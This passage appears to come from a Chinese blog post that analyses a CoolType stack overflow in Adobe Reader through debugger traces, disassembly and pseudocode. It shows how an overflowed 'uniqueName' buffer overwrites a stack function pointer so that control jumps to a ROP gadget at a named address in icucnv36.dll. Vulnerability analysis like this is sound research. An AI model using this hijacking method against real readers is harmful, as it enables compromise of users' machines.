class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                <span class="comment">;   ebp=esp=0x0012DD68</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB24      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_18]            <span class="comment">; arg6&lt;-a7: [ebp+0x20]=[0x0012DD88]=0x01</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB27      <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+arg_0]        <span class="comment">; this&lt;-a1: ecx=[ebp+0x8]=[0x0012DD670]=0x01F347B8(StreamHandler类对象地址)</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB2A      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_14]            <span class="comment">; arg5&lt;-a6: [ebp+0x1c]=[0x0012DD84]=0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB2D      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ecx</span>]              <span class="comment">;   eax=[ecx]=[0x01F347B8]=0x081A601C(虚表指针)</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB2F      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_10]            <span class="comment">; arg4&lt;-a5: [ebp+0x18]=[0x0012DD80]=0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB32      <span class="keyword">inc</span>     dword_823A6A0           <span class="comment">;   [0x0823A6A0]=0x0-&gt;0x1</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB38      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_C]             <span class="comment">; arg3&lt;-a4: [ebp+0x14]=[0x0012DD7C]=0x0012DDE4</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB3B      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_8]             <span class="comment">; arg2&lt;-a3: [ebp+0x10]=[0x0012DD78]=0x0012DDC8</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB3E      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]             <span class="comment">; arg1&lt;-a2: [ebp+0xC]=[0x0012DD74]=0x0012E718 &lt;------ 对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB41      <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>]         <span class="comment">;   [eax]=0x808B116(StreamHandler类虚函数)</span></span><br><span class="line">                                           <span class="built_in">esp</span> --&gt;  0012DD4C  0801BB43  返回到 CoolType.0801BB43</span><br><span class="line">                                                    0012DD50  0012E718  arg1 对象(<span class="number">0x0012E718</span>)的指针</span><br><span class="line">                                                    0012DD54  0012DDC8  arg2</span><br><span class="line">                                                    0012DD58  0012DDE4  arg3</span><br><span class="line">                                                    0012DD5C  <span class="number">00000000</span>  arg4</span><br><span class="line">                                                    0012DD60  <span class="number">00000000</span>  arg5</span><br><span class="line">                                                    0012DD64  <span class="number">00000001</span>  arg6</span><br><span class="line">                                           <span class="built_in">ebp</span> --&gt;  0012DD68  0012DDF8  </span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">****************************************************************************************************************************</span><br><span class="line"></span><br><span class="line"><span class="symbol">.rdata:</span>081A601C <span class="comment">; const StreamHandler::`vftable'</span></span><br><span class="line"><span class="symbol">.rdata:</span>081A601C ??_7StreamHandler@@6B@ <span class="built_in">dd</span> offset sub_808B116</span><br><span class="line"></span><br><span class="line">StreamHandler类虚函数：</span><br><span class="line">char __thiscall sub_808B116(char *this, <span class="keyword">int</span> a2, <span class="keyword">int</span> *a3, _<span class="built_in">DWORD</span> *a4, _<span class="built_in">DWORD</span> *a5, unsigned <span class="keyword">int</span> *a6, <span class="keyword">int</span> a7)</span><br><span class="line"></span><br><span class="line">****************************************************************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>0808B116      <span class="keyword">push</span>    <span class="built_in">ebp</span>                 <span class="comment">;   [0x0012DD48]=ebp=0x0012DD68</span></span><br><span class="line"><span class="symbol">.text:</span>0808B117      <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>            <span class="comment">;   ebp=esp=0x0012DD48</span></span><br><span class="line"><span class="symbol">.text:</span>0808B119      <span class="keyword">push</span>    <span class="built_in">ecx</span>                 <span class="comment">; arg_5: [0x0012DD44]=ecx=0x01F347B8(StreamHandler类对象地址)</span></span><br><span class="line"><span class="symbol">.text:</span>0808B11A      <span class="keyword">push</span>    <span class="built_in">ebx</span>                 <span class="comment">; arg_4: [0x0012DD40]=ebx=0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>0808B11B      <span class="keyword">push</span>    <span class="built_in">esi</span>                 <span class="comment">; arg_3: [0x0012DD3C]=esi=0x0012E608 对象(0x0012E608)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0808B11C      <span class="keyword">push</span>    <span class="built_in">edi</span>                 <span class="comment">; arg_2: [0x0012DD38]=edi=0x0012E718 对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0808B11D      <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+arg_0]    <span class="comment">;   edi=[ebp+0x8]=[0x0012DD50]=0x0012E718 &lt;------ edi = a2</span></span><br><span class="line"><span class="symbol">.text:</span>0808B120      <span class="keyword">push</span>    <span class="built_in">edi</span>                 <span class="comment">; arg_1: [0x0012DD34]=edi=0x0012E718 对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0808B121      <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">ecx</span>            <span class="comment">;   esi=ecx=0x01F347B8(StreamHandler类对象地址)</span></span><br><span class="line"><span class="symbol">.text:</span>0808B123      <span class="keyword">call</span>    sub_808B02A         <span class="comment">; </span></span><br><span class="line"><span class="symbol">.text:</span>0808B128      <span class="keyword">xor</span>     <span class="built_in">ebx</span>, <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>0808B12A      <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line"><span class="symbol">.text:</span>0808B12C      <span class="keyword">jz</span>      loc_808B2CB</span><br><span class="line">..........</span><br><span class="line"><span class="symbol">.text:</span>0808B2CB      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>]</span><br><span class="line"><span class="symbol">.text:</span>0808B2CD      <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+arg_14+<span class="number">3</span>], <span class="built_in">bl</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2D0      <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">70h</span>]</span><br><span class="line"><span class="symbol">.text:</span>0808B2D3      <span class="keyword">push</span>    <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2D4      <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">esi</span>+<span class="number">14h</span>]</span><br><span class="line"><span class="symbol">.text:</span>0808B2D7      <span class="keyword">call</span>    sub_801E540</span><br><span class="line"><span class="symbol">.text:</span>0808B2DC      <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">0E0h</span>], <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2E3      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">edi</span>+<span class="number">3Ch</span>]   &lt;-------<span class="built_in">eax</span>=[<span class="built_in">edi</span>+<span class="number">3Ch</span>]=[<span class="number">0x0012E718</span>+<span class="number">0x3C</span>]=[<span class="number">0x0012E754</span>]=<span class="number">0x0012E6D0</span>(对象<span class="number">0x0012E6B0</span>中的一个函数指针)</span><br><span class="line"><span class="symbol">.text:</span>0808B2E6      <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2E8      <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">2F4h</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2EE      <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">2F8h</span>], <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2F4      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_4], <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2F7      <span class="keyword">jnz</span>     short loc_808B300</span><br><span class="line"><span class="symbol">.text:</span>0808B2F9</span><br><span class="line"><span class="symbol">.text:</span>0808B2F9 loc_808B2F9:                      </span><br><span class="line"><span class="symbol">.text:</span>0808B2F9      <span class="keyword">xor</span>     <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2FB      <span class="keyword">jmp</span>     loc_808B594</span><br><span class="line"><span class="symbol">.text:</span>0808B300 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>0808B300</span><br><span class="line"><span class="symbol">.text:</span>0808B300 loc_808B300:                           </span><br><span class="line"><span class="symbol">.text:</span>0808B300      <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_4]</span><br><span class="line"><span class="symbol">.text:</span>0808B303      <span class="keyword">push</span>    <span class="built_in">ecx</span>                 <span class="comment">; [0x0012DD34]=ecx=0x0012DD44</span></span><br><span class="line"><span class="symbol">.text:</span>0808B304      <span class="keyword">push</span>    <span class="built_in">ebx</span>                 <span class="comment">; [0x0012DD30]=ebx=0x0</span></span><br><span class="line"><span class="symbol">.text:</span>0808B305      <span class="keyword">push</span>    <span class="number">3</span>                   <span class="comment">; [0x0012DD2C]=0x3</span></span><br><span class="line"><span class="symbol">.text:</span>0808B307      <span class="keyword">push</span>    <span class="built_in">eax</span>                 <span class="comment">; [0x0012DD28]=eax=0x0012E6D0</span></span><br><span class="line"><span class="symbol">.text:</span>0808B308      <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>]     <span class="comment">; eax=0x0012E6D0,[0x0012E6D0]=0x4A80CB38 &lt;------- ROPgadget1</span></span><br><span class="line">                    (*v20)(v20, <span class="number">3</span>, <span class="number">0</span>, &amp;v31)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<p><strong><code>触发流程图:</code></strong></p>
<div align="left"><img src="/resources/2018/2018-06-01-04.png" width="80%" height="60%" alt="触发流程"></div>

<p>&emsp;&emsp;这里不知道为什么不能用ollydbg的<code>调用堆栈窗口</code>查看栈回溯,在调用<code>sub_808B116()</code>函数时,<code>栈回溯窗口</code>清空了,执行完<code>sub_808B116()</code>函数中的<code>0x0808B308</code>处的调用指令<code>call dword ptr [eax]</code>,跳转到<code>0x4A80CB38</code>处时,<code>调用堆栈信息</code>又显示出来了,而且此<code>ROPgadget的调用者</code>也发生了改变。下面显示<code>0x4A80CB38</code>处的<code>ROPgadget</code>的调用是来自<code>CoolType.0801BB41</code>,而这个地址在<code>sub_801BB21()</code>函数的地址范围中,并且是<code>调用sub_808B116()</code>函数的指令的地址。实际情况确是<code>sub_808B116()</code>函数调用的<code>0x4A80CB38</code>处的<code>ROPgadget</code>。是因为sub_808B116()函数是虚函数吗？没搞清楚。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--&gt; 4A80CB38    81C5 <span class="number">94070000</span>   <span class="keyword">add</span> <span class="built_in">ebp</span>,<span class="number">0x794</span></span><br><span class="line">    4A80CB3E    C9              <span class="keyword">leave</span></span><br><span class="line">    4A80CB3F    C3              <span class="keyword">retn</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;调用堆栈：     主线程</span></span><br><span class="line"><span class="comment">;地址        堆栈       函数过程 / 参数          调用来自                结构</span></span><br><span class="line"><span class="comment">;0012DD4C   0801BB43   icucnv36.4A80CB38       CoolType.0801BB41      0012DD48</span></span><br><span class="line"><span class="comment">;0012DD6C   08016C5B   ? CoolType.0801BB21     CoolType.08016C56      0012DD68</span></span><br><span class="line"><span class="comment">;0012E460   0803DEB4   ? CoolType.08016BDE     CoolType.0803DEAF      0012DDF8</span></span><br></pre></td></tr></table></figure>
<h5 id="2-4、触发原因"><a href="#2-4、触发原因" class="headerlink" title="2.4、触发原因"></a>2.4、触发原因</h5><p>&emsp;&emsp;通过前面的分析我们可以知道,地址<code>0x0808B308</code>处的<code>调用指令</code>是通过以<code>eax的值</code>为地址,得到存储在<code>地址处的值</code>,作为所调用<code>函数的地址</code>,进行函数调用的。<code>eax=0x0012E6D0</code>,所以<code>函数的地址值</code>存储在<code>栈</code>上,而且刚好落在我们构造的<code>“uniqueName”字段</code>在栈上的缓冲区内,所以我们可以<code>覆盖</code>这个函数的<code>地址值</code>,达到<code>劫持程序控制流</code>的目的。而我们往上回溯,<code>eax的值</code>是以<code>edi+0x3C</code>为地址的变量的值。<code>edi</code>的值为<code>0x0012E718</code>,正是前面通过<code>sub_80DD0B3()</code>函数调用<code>sub_080151B5()</code>函数清零的<code>栈空间的首地址</code>,也是<code>sub_80DD0B3()</code>函数的<code>ebp</code>。在执行<code>sub_80DD0B3()</code>函数之前,<code>edi+0x3C=0x0012E754</code>处的值为<code>0xFFFFFFFF</code>,而在调用<code>0x080DD2F3</code>处的<code>sub_803DCF9()</code>函数时,已经被赋值为了<code>0x0012E6D0</code>。说明赋值的语句在调用<code>sub_803DCF9()</code>函数之前。这里<code>分析的目的</code>主要是看是否覆盖了<code>特殊结构的指针</code>,而达到了程序<code>控制流的劫持</code>。比如,是否覆盖了<code>SEH异常处理结构</code>,又或者是覆盖了<code>虚表指针</code>和虚表中的<code>虚函数地址</code>。首先在IDA中看一下,是哪里赋的值：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_80DD0B3</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, _DWORD *a5, <span class="keyword">int</span> a6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">int</span> v10; <span class="comment">// [esp+B8h] [ebp-68h],[0x0012E718-0x68]=[0x0012E6B0]</span></span><br><span class="line">    <span class="keyword">char</span> v11; <span class="comment">// [esp+D8h] [ebp-48h],[0x0012E718-0x48]=[0x0012E6D0]存储函数地址的变量(函数指针)</span></span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">char</span> v31; <span class="comment">// [esp+134h] [ebp+14h],[0x0012E718+0x14]=[0x0012E72C]</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v32; <span class="comment">// [esp+15Ch] [ebp+3Ch],[0x0012E718+0x3C]=[0x0012E754]</span></span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">//&amp;v10为对象首地址,此函数应为对象(0x0012E6B0)的有参构造函数</span></span><br><span class="line">    sub_8083452(&amp;v10, a2);<span class="comment">//执行完后,[ebp-0x48]=[0x0012E6D0]=0x080833EF,这是一个函数的地址</span></span><br><span class="line">    v25 = <span class="number">1</span>;</span><br><span class="line">    sub_8084D13(</span><br><span class="line">        (<span class="keyword">void</span> (__cdecl **)(_DWORD, _DWORD, _DWORD, _DWORD))(v10 != <span class="number">0</span> ? (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v11 : <span class="number">0</span>),</span><br><span class="line">        &amp;v20,</span><br><span class="line">        &amp;v18,</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v17,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>);</span><br><span class="line">    ......</span><br><span class="line">    sub_801605B(&amp;v31, &amp;v10); <span class="comment">//&amp;v31为对象首地址</span></span><br><span class="line">    v32 = v10 != <span class="number">0</span> ? (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v11 : <span class="number">0</span>; <span class="comment">//[0x0012E754]=0x0012E6D0,v32[0x0012E754]为对象(0x0012E718)中的一个成员变量</span></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">对象(0x0012E6B0)的内存布局(初始):</span></span><br><span class="line"><span class="comment">0x0012E6B0 *v2 = *a2     -| &#123;sub_8014E64&#125;</span></span><br><span class="line"><span class="comment">0x0012E6B4 v2[1] = a2[1] -|</span></span><br><span class="line"><span class="comment">0x0012E6B8 v2[2] = 0; ------------------------|</span></span><br><span class="line"><span class="comment">0x0012E6BC *a2 = v9   -|                      |</span></span><br><span class="line"><span class="comment">0x0012E6C0 a2[1] = a3  |                      |</span></span><br><span class="line"><span class="comment">0x0012E6C4 a2[2] = v8  | &#123;sub_8080FB5&#125;        | &#123;sub_8083452&#125;</span></span><br><span class="line"><span class="comment">0x0012E6C8 a2[3] = v7 -|                      |</span></span><br><span class="line"><span class="comment">0x0012E6CC v2[7] = v2[5] ---------------------|</span></span><br><span class="line"><span class="comment">0x0012E6D0 v2[8] = sub_80833EF ---------------| (函数指针)</span></span><br><span class="line"><span class="comment">0x0012E6D4 v2[9] = v2 ------------------------|</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;由这可知,<code>v32变量</code>在栈上的位置为<code>ebp+0x3C</code>,即v32为栈上<code>0x0012E718+0x3C=0x0012E754</code>处的变量。最下面的那一行代码是它的<code>赋值语句</code>。由于我对<code>SEH结构</code>是怎么被放在<code>栈</code>上,并形成<code>SEH链表</code>的细节不太熟悉,所以,顺便分析了一下函数向栈上<code>构建SEH结构</code>的过程。下面是一些详细的调试信息：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line">***********************************************************************************</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> __cdecl sub_80DD0B3(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, _<span class="built_in">DWORD</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line"></span><br><span class="line">***********************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>080DD0B3        <span class="keyword">push</span>    <span class="built_in">ebp</span>                              <span class="comment">; [0x0012E7E8]=ebp=0x0012E838,父函数ebp</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0B4        <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">0CCh</span>                        <span class="comment">; esp=0x0012E71C</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0BA        <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>-<span class="number">4</span>]                     <span class="comment">; ebp=0x0012E718,本函数ebp</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0BE        <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie          <span class="comment">; eax=0x78FC1194</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0C3        <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span>                         <span class="comment">; eax=eax^ebp=0x78EEF68C</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0C5        <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_4], <span class="built_in">eax</span>            <span class="comment">; [ebp+0xcc] = [0x0012E7E4] = 0x78EEF68C,父函数ebp之上</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0CB        <span class="keyword">push</span>    <span class="number">104h</span>                             <span class="comment">; [esp-0x4]=[0x0012E718]=0x104,(__EH_prolog3中分配的栈空间大小)</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0D0        <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8182A36          <span class="comment">; eax=0x8182A36(__security_check_cookie函数地址)</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0D5        <span class="keyword">call</span>    __EH_prolog3                     <span class="comment">; [0x0012E714]=ret=0x080DD0DA</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line"><span class="symbol">.text:</span>0804819E __EH_prolog3    proc <span class="built_in">near</span>(向栈上写入SEH结构)</span><br><span class="line"></span><br><span class="line">0804819E       <span class="keyword">push</span> <span class="built_in">eax</span>                            <span class="comment">; [0x0012E710]=eax=0x08182A36(__security_check_cookie函数地址)SE处理程序</span></span><br><span class="line">0804819F       <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>]               <span class="comment">; [0x0012E70C]=0x0012E82C,指向下一个SEH记录的指针</span></span><br><span class="line">080481A6       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="number">0xC</span>]      <span class="comment">; eax=esp+0xc=0x0012E70C+0xC=0x0012E718</span></span><br><span class="line">080481AA       <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="number">0xC</span>]      <span class="comment">; esp=esp-[0x0012E718]=0x0012E70C-0x104=0x0012E608,分配栈空间</span></span><br><span class="line">                                                栈: 0012E608   7C812FD3  返回到 kernel32.7C812FD3 来自 ntdll.RtlRaiseException</span><br><span class="line">080481AE       <span class="keyword">push</span> <span class="built_in">ebx</span>                            <span class="comment">; [0x0012E604]=ebx=0x0</span></span><br><span class="line">080481AF       <span class="keyword">push</span> <span class="built_in">esi</span>                            <span class="comment">; [0x0012E600]=esi=0x0823AE9C(.data段)</span></span><br><span class="line">080481B0       <span class="keyword">push</span> <span class="built_in">edi</span>                            <span class="comment">; [0x0012E5FC]=edi=0x0012E858</span></span><br><span class="line">080481B1       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>],<span class="built_in">ebp</span>          <span class="comment">; [eax]=[0x0012E718]=ebp=0x0012E718,覆盖传进来的参数0x104</span></span><br><span class="line">080481B3       <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">eax</span>                         <span class="comment">; </span></span><br><span class="line">080481B5       <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x8230FB8</span>]    <span class="comment">; eax=ds:[0x8230FB8]=0x78FC1194(___security_cookie)</span></span><br><span class="line">080481BA       <span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">ebp</span>                         <span class="comment">; eax=eax^ebp=0x78FC1194^0x0012E718=0x78EEF68C,再计算一次security cookie</span></span><br><span class="line">080481BC       <span class="keyword">push</span> <span class="built_in">eax</span>                            <span class="comment">; [0x0012E5F8]=eax=0x78EEF68C,异或之后的sec cookie</span></span><br><span class="line">080481BD       <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4</span>]         <span class="comment">; [0x0012E5F4]=[0x0012E718-0x4]=[0x0012E714]=0x080DD0DA,返回地址</span></span><br><span class="line">080481C0       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4</span>],-<span class="number">0x1</span>     <span class="comment">; [0x0012E714]=0xFFFFFFFF,本来的返回地址被修改</span></span><br><span class="line">080481C7       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xC</span>]      <span 